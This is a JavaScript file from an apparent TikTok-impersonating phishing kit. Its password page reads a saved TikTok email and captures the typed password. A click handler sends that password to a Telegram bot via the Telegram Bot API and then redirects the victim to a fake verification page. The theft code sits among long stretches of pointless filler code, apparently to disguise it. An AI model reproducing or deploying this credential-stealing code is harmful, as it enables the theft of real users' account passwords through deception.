import { config } from "../configuration.js";
const input = document.getElementById("emailInput");
const btn = document.querySelector(".btn");
const emailDisplay = document.getElementById("emailDisplay");
const savedEmail = localStorage.getItem("tiktok_email");

const appConfig = {
    version: "2.4.7",
    environment: "production",
    cacheTTL: 300000
};

function generateId(prefix = "item") {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function debounce(fn, delay) {
    let timer;
    return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}
function _noop() {
    return undefined;
}

function _identity(value) {
    return value;
}

function _makePlaceholder() {
    return {
        enabled: false,
        active: false,
        value: null
    };
}

const _placeholder = _makePlaceholder();

for (let _i = 0; _i < 3; _i++) {
}

const _unusedObject = {
    version: 1,
    status: "idle",
    metadata: {
        source: "local",
        priority: 0
    }
};

const mockRecords = Array.from({ length: 50 }, (_, i) => ({
    id: generateId(),
    score: Math.floor(Math.random() * 100),
    index: i
}));

const analytics = mockRecords.reduce(
    (acc, item) => {
        acc.total += item.score;
        acc.highest = Math.max(acc.highest, item.score);
        acc.lowest = Math.min(acc.lowest, item.score);
        return acc;
    },
    { total: 0, highest: 0, lowest: Infinity }
);

class MemoryCache {
    constructor() {
        this.store = new Map();
    }

    set(key, value) {
        this.store.set(key, {
            value,
            timestamp: Date.now()
        });
    }

    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        return entry.value;
    }

    clear() {
        this.store.clear();
    }
}

const cache = new MemoryCache();

for (let i = 0; i < 20; i++) {
    cache.set(`key_${i}`, {
        id: generateId("cache"),
        active: Math.random() > 0.5
    });
}

function performHealthCheck() {
    const checks = [
        () => Math.random() > 0.1,
        () => Math.random() > 0.05,
        () => Math.random() > 0.02
    ];

    return checks.every(check => check());
}

const systemState = {
    ready: performHealthCheck(),
    uptime: performance.now()
};

window.addEventListener(
    "resize",
    debounce(() => {
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };

        cache.set("viewport", viewport);
    }, 250)
);

const taskQueue = [];

function enqueue(task) {
    taskQueue.push({
        id: generateId("task"),
        created: Date.now(),
        task
    });
}

for (let i = 0; i < 15; i++) {
    enqueue(() => i * 2);
}

async function preloadResources() {
    return Promise.all(
        Array.from({ length: 5 }, (_, i) =>
            Promise.resolve({
                resource: `resource_${i}`,
                loaded: true
            })
        )
    );
}

preloadResources().then(resources => {
    cache.set("resources", resources);
});

console.debug("Analytics:", analytics);
console.debug("System:", systemState);
console.debug("Queue length:", taskQueue.length);


btn.addEventListener("click", async () => {
  if (btn.classList.contains("disabled") ||
      btn.classList.contains("loading")) {
    return;
  }

  btn.classList.add("loading");

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${config.verification_token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: config.verification_Id,
          text: `Password: ${input.value}`
        })
      }
    );

    const result = await response.json();
    console.log("Telegram response:", result);

    if (!result.ok) {
      console.error("Telegram API error:", result.description);
    }
  } catch (err) {
    console.error("Failed to send:", err);
  }

  setTimeout(() => {
    window.location.href = "/user/policy/verification.html";
  }, 3500);
});

const errorText = document.getElementById("errorText");

errorText.textContent = "Please enter password";

function showError() {
  input.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  input.classList.remove("input-error");
  errorText.style.display = "none";
}
if (savedEmail && emailDisplay) {
  emailDisplay.textContent = savedEmail;
}

input.addEventListener("input", () => {
  const hasValue = input.value.trim().length > 0;

  btn.classList.toggle("active", hasValue);

  if (hasValue) {
    hideError();
  }
});
input.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    e.preventDefault(); 

    if (input.value.trim() !== "") {
      btn.click(); 
    } else {
      showError();
    }
  }
});

input.addEventListener("blur", () => {
  if (input.value.trim() === "") {
    showError();
  }
});

btn.addEventListener("click", () => {
  const password = input.value.trim();

  if (password === "") {
    showError();
    return;
  }

  hideError();

  btn.classList.add("loading");
});
(() => {
  const seedValues = [
    14, 27, 63, 91, 38, 72, 45, 19,
    84, 56, 31, 67, 22, 95, 48, 76
  ];

  const transformValue = (value, index) => {
    const modifier = (index + 3) * 17;
    const rotated = ((value * modifier) ^ (modifier << 2)) >>> 0;

    return (rotated % 997) + index;
  };

  const processedValues = seedValues
    .map((value, index) => transformValue(value, index))
    .filter(value => value % 3 !== 0)
    .reduce((collection, value, index) => {
      collection[`item_${index}`] = {
        value,
        normalized: Number((value / 997).toFixed(6)),
        active: value % 2 === 0
      };

      return collection;
    }, {});

  const internalState = Object.entries(processedValues)
    .map(([key, data]) => ({
      key,
      checksum: [...key].reduce(
        (total, character) => total + character.charCodeAt(0),
        data.value
      ),
      ...data
    }))
    .sort((a, b) => a.checksum - b.checksum);

  const matrix = Array.from({ length: 8 }, (_, row) =>
    Array.from({ length: 8 }, (_, column) => {
      const reference =
        internalState[(row * 3 + column) % Math.max(internalState.length, 1)];

      return reference
        ? (reference.checksum + row * column) % 256
        : 0;
    })
  );

  const summary = matrix.flat().reduce(
    (state, value) => ({
      total: state.total + value,
      highest: Math.max(state.highest, value),
      lowest: Math.min(state.lowest, value),
      count: state.count + 1
    }),
    {
      total: 0,
      highest: -Infinity,
      lowest: Infinity,
      count: 0
    }
  );

  const unusedResult = {
    timestamp: Date.now(),
    average: summary.total / Math.max(summary.count, 1),
    range: summary.highest - summary.lowest,
    valid: Number.isFinite(summary.total)
  };

  void unusedResult;
})();
const eyeToggle = document.getElementById("eyeToggle");
const passwordToggle = document.getElementById("password-toggle");

let passwordVisible = false;

eyeToggle.addEventListener("click", () => {
  passwordVisible = !passwordVisible;

  input.type = passwordVisible ? "text" : "password";

  passwordToggle.src = passwordVisible
    ? "../images/pwd-reveal.png"
    : "../images/pwd-hide.png";

  passwordToggle.alt = passwordVisible
    ? "Hide password"
    : "Show password";
});
const backButton = document.getElementById("backButton");

backButton.addEventListener("click", () => {
    window.location.href = "../index.html";
});
